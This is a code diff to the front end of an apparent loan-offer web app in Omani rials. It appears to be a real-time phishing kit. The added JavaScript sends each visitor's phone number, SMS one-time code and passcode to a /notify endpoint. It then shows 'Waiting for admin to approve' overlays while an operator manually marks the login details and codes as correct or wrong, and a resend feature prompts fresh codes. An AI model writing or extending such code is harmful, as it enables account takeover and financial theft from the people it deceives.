@@ -591,139 +591,405 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
 </div><!-- /app-root -->
 
 <script>
-/* ── Navigation ── */
+'use strict';
+
+/* ════════════════════════════════════════
+   CONFIG — base URL auto-detects current host
+════════════════════════════════════════ */
+const API = ''; // empty = same origin (server.js serves index.html)
+
+/* ════════════════════════════════════════
+   STATE
+════════════════════════════════════════ */
+let prefix     = '+968';
+let pollTimer  = null;   // active polling interval
+let pollToken  = null;   // current token being polled
+let otpTimer   = null;   // OTP countdown interval
+let pcVal      = '';     // passcode digits entered
+
+/* ════════════════════════════════════════
+   NAVIGATION
+════════════════════════════════════════ */
 function goTo(id){
-  const cur=document.querySelector('.screen.active');
-  const nxt=document.getElementById(id);
-  if(!nxt||cur===nxt)return;
-  cur.classList.add('exit-left');cur.classList.remove('active');
-  cur.addEventListener('transitionend',()=>cur.classList.remove('exit-left'),{once:true});
+  const cur = document.querySelector('.screen.active');
+  const nxt = document.getElementById(id);
+  if(!nxt || cur===nxt) return;
+  cur.classList.add('exit-left');
+  cur.classList.remove('active');
+  cur.addEventListener('transitionend', ()=>cur.classList.remove('exit-left'), {once:true});
   nxt.classList.add('active');
-  if(id==='screen-otp')enterOtp();
-  if(id==='screen-passcode')enterPasscode();
-  if(id==='screen-success')enterSuccess();
+  if(id==='screen-otp')      enterOtp();
+  if(id==='screen-passcode') enterPasscode();
+  if(id==='screen-success')  enterSuccess();
 }
 
-/* ── Helpers ── */
-function fmtOMR(v){return v.toFixed(3)+' OMR';}
-function calcMonthly(p,n,r){const m=r/100/12;if(!m)return p/n;return p*m*Math.pow(1+m,n)/(Math.pow(1+m,n)-1);}
+/* ════════════════════════════════════════
+   UI HELPERS
+════════════════════════════════════════ */
+function fmtOMR(v){ return (+v).toFixed(3)+' OMR'; }
+function calcMonthly(p,n,r){ const m=r/100/12; if(!m) return p/n; return p*m*Math.pow(1+m,n)/(Math.pow(1+m,n)-1); }
 
-/* ── S1: Slider ── */
+/* Loading overlay — blocks UI while waiting for admin */
+function showOverlay(msg='Waiting for verification…'){
+  let el = document.getElementById('walletii-overlay');
+  if(!el){
+    el = document.createElement('div');
+    el.id = 'walletii-overlay';
+    el.style.cssText = `
+      position:fixed;inset:0;z-index:9999;
+      background:rgba(12,21,28,.88);
+      display:flex;flex-direction:column;
+      align-items:center;justify-content:center;gap:18px;
+      backdrop-filter:blur(4px);
+    `;
+    el.innerHTML = `
+      <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
+        <circle cx="22" cy="22" r="18" stroke="#243744" stroke-width="4"/>
+        <circle cx="22" cy="22" r="18" stroke="#00d2ad" stroke-width="4"
+          stroke-dasharray="90" stroke-dashoffset="60" stroke-linecap="round"
+          style="transform-origin:center;animation:spin 1s linear infinite"/>
+      </svg>
+      <style>@keyframes spin{to{transform:rotate(360deg);}}</style>
+      <div id="overlay-msg" style="color:#f4f8fb;font-size:15px;font-weight:700;font-family:'Nunito',sans-serif;text-align:center;padding:0 32px;line-height:1.5;">${msg}</div>
+    `;
+    document.body.appendChild(el);
+  } else {
+    document.getElementById('overlay-msg').textContent = msg;
+    el.style.display = 'flex';
+  }
+}
+function hideOverlay(){
+  const el = document.getElementById('walletii-overlay');
+  if(el) el.style.display = 'none';
+}
+
+/* Shake animation for wrong inputs */
+function shakeScreen(id){
+  const el = document.getElementById(id);
+  if(!el) return;
+  el.style.animation = 'none';
+  el.getBoundingClientRect();
+  el.style.animation = 'shake .4s ease';
+  el.addEventListener('animationend', ()=>el.style.animation='', {once:true});
+}
+
+/* Toast message */
+function showToast(msg, color='#ff6b6b'){
+  let t = document.getElementById('walletii-toast');
+  if(!t){
+    t = document.createElement('div');
+    t.id = 'walletii-toast';
+    t.style.cssText = `
+      position:fixed;bottom:32px;left:50%;transform:translateX(-50%);
+      z-index:99999;padding:13px 24px;border-radius:40px;
+      font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;
+      color:#fff;white-space:nowrap;opacity:0;
+      transition:opacity .25s;pointer-events:none;
+    `;
+    document.body.appendChild(t);
+  }
+  t.textContent = msg;
+  t.style.background = color;
+  t.style.opacity = '1';
+  clearTimeout(t._hide);
+  t._hide = setTimeout(()=>{ t.style.opacity='0'; }, 3000);
+}
+
+/* Inject shake keyframes once */
+(function(){
+  const s = document.createElement('style');
+  s.textContent = `@keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-8px)}40%,80%{transform:translateX(8px)}}`;
+  document.head.appendChild(s);
+})();
+
+/* ════════════════════════════════════════
+   API HELPERS
+════════════════════════════════════════ */
+async function apiNotify(payload){
+  const r = await fetch(`${API}/notify`, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify(payload)
+  });
+  return r.json();
+}
+
+async function apiPoll(token){
+  const r = await fetch(`${API}/poll`, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({token})
+  });
+  return r.json();
+}
+
+/* Start polling every 2s. Calls onResult(result) when non-pending. */
+function startPolling(token, onResult){
+  stopPolling();
+  pollToken = token;
+  pollTimer = setInterval(async ()=>{
+    try{
+      const res = await apiPoll(pollToken);
+      if(res.ok && res.result !== 'pending'){
+        stopPolling();
+        onResult(res.result);
+      }
+    } catch(e){ /* network hiccup — keep trying */ }
+  }, 2000);
+}
+
+function stopPolling(){
+  if(pollTimer){ clearInterval(pollTimer); pollTimer=null; }
+  pollToken = null;
+}
+
+/* ════════════════════════════════════════
+   SCREEN 1 — LOAN LANDING
+════════════════════════════════════════ */
 function sliderChange(v){
-  document.getElementById('loanAmt').textContent=fmtOMR(+v);
-  document.getElementById('mRepay').textContent=fmtOMR(calcMonthly(+v,12,5));
+  document.getElementById('loanAmt').textContent = fmtOMR(+v);
+  document.getElementById('mRepay').textContent  = fmtOMR(calcMonthly(+v,12,5));
 }
 sliderChange(500);
 
-/* ── S2: Form ── */
+/* ════════════════════════════════════════
+   SCREEN 2 — LOAN DETAILS
+════════════════════════════════════════ */
 function calcUpdate(){
-  const a=+document.getElementById('p1amt').value||0;
-  const n=+document.getElementById('p1dur').value||12;
-  document.getElementById('p1rep').textContent=fmtOMR(a>0?calcMonthly(a,n,5):0);
+  const a = +document.getElementById('p1amt').value||0;
+  const n = +document.getElementById('p1dur').value||12;
+  document.getElementById('p1rep').textContent = fmtOMR(a>0 ? calcMonthly(a,n,5) : 0);
   checkForm();
 }
 function checkForm(){
-  const a=document.getElementById('p1amt').value.trim();
-  const nm=document.getElementById('p1name').value.trim();
-  const ph=document.getElementById('p1phone').value.replace(/\s/g,'');
-  const em=document.getElementById('p1employ').value;
-  const ok=a&&+a>0&&nm.length>=2&&ph.length>=7&&em!=='';
-  document.getElementById('detailsBtn').classList.toggle('active',!!ok);
+  const a  = document.getElementById('p1amt').value.trim();
+  const nm = document.getElementById('p1name').value.trim();
+  const ph = document.getElementById('p1phone').value.replace(/\s/g,'');
+  const em = document.getElementById('p1employ').value;
+  const ok = a && +a>0 && nm.length>=2 && ph.length>=7 && em!=='';
+  document.getElementById('detailsBtn').classList.toggle('active', !!ok);
 }
 function submitDetails(){
-  if(!document.getElementById('detailsBtn').classList.contains('active'))return;
+  if(!document.getElementById('detailsBtn').classList.contains('active')) return;
   goTo('screen-phone');
 }
 
-/* ── S3: Phone ── */
-let prefix='+968';
-function toggleDd(){document.getElementById('dropdown').classList.toggle('open');}
-function pickCountry(code,name,el){
-  prefix=code;
-  document.getElementById('prefixVal').textContent=code;
+/* ════════════════════════════════════════
+   SCREEN 3 — PHONE NUMBER
+   On Continue → POST /notify type=login
+   Poll for: otp_allowed → go to OTP screen
+             wrong_pin   → shake + toast
+════════════════════════════════════════ */
+function toggleDd(){ document.getElementById('dropdown').classList.toggle('open'); }
+function pickCountry(code, name, el){
+  prefix = code;
+  document.getElementById('prefixVal').textContent = code;
   document.querySelectorAll('.dropdown-item').forEach(i=>i.classList.remove('active'));
   el.classList.add('active');
   document.getElementById('dropdown').classList.remove('open');
   onPhoneInput();
 }
-document.addEventListener('click',e=>{
-  const dd=document.getElementById('dropdown');
-  const pb=document.getElementById('prefixBtn');
-  if(dd&&!dd.contains(e.target)&&!pb.contains(e.target))dd.classList.remove('open');
+document.addEventListener('click', e=>{
+  const dd = document.getElementById('dropdown');
+  const pb = document.getElementById('prefixBtn');
+  if(dd && !dd.contains(e.target) && !pb.contains(e.target)) dd.classList.remove('open');
 });
 function onPhoneInput(){
-  const v=document.getElementById('phoneInput').value.trim();
-  document.getElementById('phoneContinueBtn').classList.toggle('active',v.length>=7);
-}
-function proceedFromPhone(){
-  const v=document.getElementById('phoneInput').value.trim();
-  if(v.length<7)return;
-  document.getElementById('otpPhone').textContent=prefix+' '+v.slice(0,4)+'XXX';
-  goTo('screen-otp');
+  const v = document.getElementById('phoneInput').value.trim();
+  document.getElementById('phoneContinueBtn').classList.toggle('active', v.length>=7);
 }
 
-/* ── S4: OTP ── */
-let otpTimer=null;
+async function proceedFromPhone(){
+  if(!document.getElementById('phoneContinueBtn').classList.contains('active')) return;
+
+  const phone    = document.getElementById('phoneInput').value.trim();
+  const passcode = pcVal || undefined; // include if already set (re-entry scenario)
+
+  showOverlay('Sending login alert…');
+
+  try{
+    const res = await apiNotify({ type:'login', phone, countryCode:prefix, passcode });
+
+    if(!res.ok){
+      hideOverlay();
+      showToast('Server error. Please try again.');
+      return;
+    }
+
+    showOverlay('Waiting for admin to approve…');
+
+    startPolling(res.token, result=>{
+      hideOverlay();
+      if(result === 'otp_allowed'){
+        // Update the OTP screen phone display
+        document.getElementById('otpPhone').textContent = prefix+' '+phone.slice(0,4)+'XXX';
+        goTo('screen-otp');
+      } else if(result === 'wrong_pin'){
+        shakeScreen('screen-phone');
+        showToast('❌ Incorrect details. Please check and try again.');
+      } else {
+        showToast('Unexpected response. Please retry.');
+      }
+    });
+
+  } catch(e){
+    hideOverlay();
+    showToast('Connection error. Please try again.');
+  }
+}
+
+/* ════════════════════════════════════════
+   SCREEN 4 — OTP
+   On Continue → POST /notify type=otp
+   Poll for: otp_correct → go to passcode
+             otp_wrong   → shake + clear OTP
+   Resend    → POST /notify type=resend
+════════════════════════════════════════ */
 function enterOtp(){
-  document.getElementById('otp-hidden').value='';
+  document.getElementById('otp-hidden').value = '';
   renderOtp('');
   document.getElementById('otpBtn').classList.remove('active');
-  clearInterval(otpTimer);
-  let s=57;
-  document.getElementById('resendText').textContent=`Resend code in ${s} seconds`;
-  otpTimer=setInterval(()=>{
-    s--;
-    if(s<=0){clearInterval(otpTimer);document.getElementById('resendText').textContent='Resend code';}
-    else document.getElementById('resendText').textContent=`Resend code in ${s} seconds`;
-  },1000);
-  setTimeout(focusOtp,200);
+  startOtpCountdown();
+  setTimeout(focusOtp, 200);
 }
-function focusOtp(){document.getElementById('otp-hidden').focus();}
+
+function startOtpCountdown(){
+  clearInterval(otpTimer);
+  let s = 57;
+  const el = document.getElementById('resendText');
+  el.textContent = `Resend code in ${s} seconds`;
+  el.style.cursor = 'default';
+  el.onclick = null;
+  otpTimer = setInterval(()=>{
+    s--;
+    if(s<=0){
+      clearInterval(otpTimer);
+      el.textContent = 'Resend code';
+      el.style.cursor = 'pointer';
+      el.onclick = resendOtp;
+    } else {
+      el.textContent = `Resend code in ${s} seconds`;
+    }
+  }, 1000);
+}
+
+async function resendOtp(){
+  const phone = document.getElementById('phoneInput').value.trim();
+  try{
+    await apiNotify({ type:'resend', phone, countryCode:prefix });
+    showToast('Code resend requested ✓', '#00d2ad');
+  } catch(e){ showToast('Could not resend. Try again.'); }
+  startOtpCountdown();
+}
+
+function focusOtp(){ document.getElementById('otp-hidden').focus(); }
 function renderOtp(v){
   for(let i=0;i<6;i++){
-    const b=document.getElementById('ob'+i);
-    b.classList.remove('filled','cur');b.textContent='';
-    if(i<v.length){b.classList.add('filled');b.textContent=v[i];}
-    else{const d=document.createElement('div');d.className='dash';b.appendChild(d);if(i===v.length)b.classList.add('cur');}
+    const b = document.getElementById('ob'+i);
+    b.classList.remove('filled','cur'); b.textContent='';
+    if(i<v.length){
+      b.classList.add('filled'); b.textContent=v[i];
+    } else {
+      const d = document.createElement('div'); d.className='dash'; b.appendChild(d);
+      if(i===v.length) b.classList.add('cur');
+    }
   }
 }
 function onOtpInput(){
-  const inp=document.getElementById('otp-hidden');
-  const v=inp.value.replace(/\D/g,'').slice(0,6);inp.value=v;
+  const inp = document.getElementById('otp-hidden');
+  const v = inp.value.replace(/\D/g,'').slice(0,6); inp.value=v;
   renderOtp(v);
-  document.getElementById('otpBtn').classList.toggle('active',v.length===6);
+  document.getElementById('otpBtn').classList.toggle('active', v.length===6);
 }
 function onOtpKey(e){
-  if(e.key==='Backspace'){const inp=document.getElementById('otp-hidden');inp.value=inp.value.slice(0,-1);onOtpInput();}
-}
-function proceedFromOtp(){
-  if(!document.getElementById('otpBtn').classList.contains('active'))return;
-  clearInterval(otpTimer);goTo('screen-passcode');
+  if(e.key==='Backspace'){
+    const inp = document.getElementById('otp-hidden');
+    inp.value = inp.value.slice(0,-1);
+    onOtpInput();
+  }
 }
 
-/* ── S5: Passcode ── */
-let pcVal='';
-function enterPasscode(){pcVal='';renderDots();document.getElementById('pcBack').classList.remove('show');}
+async function proceedFromOtp(){
+  if(!document.getElementById('otpBtn').classList.contains('active')) return;
+
+  const otp   = document.getElementById('otp-hidden').value;
+  const phone = document.getElementById('phoneInput').value.trim();
+
+  clearInterval(otpTimer);
+  showOverlay('Verifying OTP code…');
+
+  try{
+    const res = await apiNotify({ type:'otp', phone, countryCode:prefix, otp });
+
+    if(!res.ok){
+      hideOverlay();
+      showToast('Server error. Please try again.');
+      startOtpCountdown();
+      return;
+    }
+
+    showOverlay('Waiting for admin to verify code…');
+
+    startPolling(res.token, result=>{
+      hideOverlay();
+      if(result === 'otp_correct'){
+        goTo('screen-passcode');
+      } else if(result === 'otp_wrong'){
+        shakeScreen('screen-otp');
+        showToast('❌ Wrong code. Please check and try again.');
+        // Clear OTP and let user re-enter
+        document.getElementById('otp-hidden').value='';
+        renderOtp('');
+        document.getElementById('otpBtn').classList.remove('active');
+        startOtpCountdown();
+        setTimeout(focusOtp, 300);
+      } else {
+        showToast('Unexpected response. Please retry.');
+        startOtpCountdown();
+      }
+    });
+
+  } catch(e){
+    hideOverlay();
+    showToast('Connection error. Please try again.');
+    startOtpCountdown();
+  }
+}
+
+/* ════════════════════════════════════════
+   SCREEN 5 — PASSCODE
+════════════════════════════════════════ */
+function enterPasscode(){
+  pcVal = '';
+  renderDots();
+  document.getElementById('pcBack').classList.remove('show');
+}
 function renderDots(){
-  for(let i=0;i<6;i++)document.getElementById('dc'+i).classList.toggle('on',i<pcVal.length);
-  document.getElementById('pcBack').classList.toggle('show',pcVal.length>0);
+  for(let i=0;i<6;i++) document.getElementById('dc'+i).classList.toggle('on', i<pcVal.length);
+  document.getElementById('pcBack').classList.toggle('show', pcVal.length>0);
 }
 function pcKey(d){
-  if(pcVal.length>=6)return;
-  pcVal+=d;renderDots();
-  if(pcVal.length===6)setTimeout(()=>goTo('screen-success'),320);
+  if(pcVal.length>=6) return;
+  pcVal += d;
+  renderDots();
+  if(pcVal.length===6) setTimeout(()=>goTo('screen-success'), 320);
 }
-function pcBackspace(){if(pcVal.length){pcVal=pcVal.slice(0,-1);renderDots();}}
+function pcBackspace(){
+  if(pcVal.length){ pcVal=pcVal.slice(0,-1); renderDots(); }
+}
 
-/* ── S6: Success ── */
+/* ════════════════════════════════════════
+   SCREEN 6 — SUCCESS
+════════════════════════════════════════ */
 function enterSuccess(){
-  const a=+document.getElementById('p1amt').value||500;
-  const n=+document.getElementById('p1dur').value||12;
-  document.getElementById('summAmt').textContent=fmtOMR(a);
-  document.getElementById('summDur').textContent=n+' months';
-  document.getElementById('summRep').textContent=fmtOMR(calcMonthly(a,n,5));
-  const c=document.querySelector('.ok-check');
-  if(c){c.style.animation='none';c.getBoundingClientRect();c.style.animation='';}
+  const a = +document.getElementById('p1amt').value||500;
+  const n = +document.getElementById('p1dur').value||12;
+  document.getElementById('summAmt').textContent = fmtOMR(a);
+  document.getElementById('summDur').textContent = n+' months';
+  document.getElementById('summRep').textContent = fmtOMR(calcMonthly(a,n,5));
+  const c = document.querySelector('.ok-check');
+  if(c){ c.style.animation='none'; c.getBoundingClientRect(); c.style.animation=''; }
+  stopPolling();
 }
 </script>
 </body>
